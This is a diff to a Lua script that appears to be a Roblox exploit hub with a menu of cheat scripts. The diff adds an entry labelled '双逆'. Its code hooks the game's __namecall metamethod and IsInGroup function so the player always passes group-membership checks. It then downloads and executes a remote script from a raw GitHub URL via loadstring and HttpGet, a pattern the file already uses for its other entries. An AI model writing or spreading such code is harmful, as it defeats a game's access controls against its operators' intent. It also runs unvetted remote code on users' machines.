@@ -317,7 +317,7 @@ RunService.RenderStepped:Connect(function()
     end
 end)local function getFunctions(category)
     local funcs = {
-        ["脚本1"] = {"夜脚本", "ROB V2", "Emote脚本"},
+        ["脚本1"] = {"夜脚本", "ROB V2", "Emote脚本", "双逆"},
         ["脚本2"] = {"脚本E", "脚本F", "脚本G"},
         ["脚本3"] = {"脚本H", "脚本I", "脚本J"},
         ["脚本4"] = {"脚本K", "脚本L", "脚本M"},
@@ -403,6 +403,24 @@ local function rebuildContent(category)
                         loadstring(game:HttpGet("https://raw.githubusercontent.com/Zyb150933/ROB/refs/heads/main/ROB.V2"))()
                     elseif funcName == "Emote脚本" then
                         loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-7yd7-I-Emote-Script-48024"))()
+                    elseif
+funcName == "双逆" then
+
+local getnamecallmethod
+= getnamecallmethod
+local Speaker = cloneref(game:GetService("Players")).LocalPlayer
+local OldNameCall
+OldNameCall = hookmetamethod(game, "__namecall", function(self, ...)
+if self ~= Speaker or getnamecallmethod() ~= "IsInGroup" then
+return OldNameCall(self, ...)
+end
+return true
+end)
+hookfunction(Speaker.IsInGroup, function(self, ...)
+return true
+end)loadstring(game:HttpGet("https://raw.githubusercontent.com/ShenJiaoBen/ScriptLoader/refs/heads/main/Linni_FreeLoader.lua"))()
+￼
+
                     elseif funcName == "脚本E" then
                         -- 放脚本E代码
                     elseif funcName == "脚本F" then
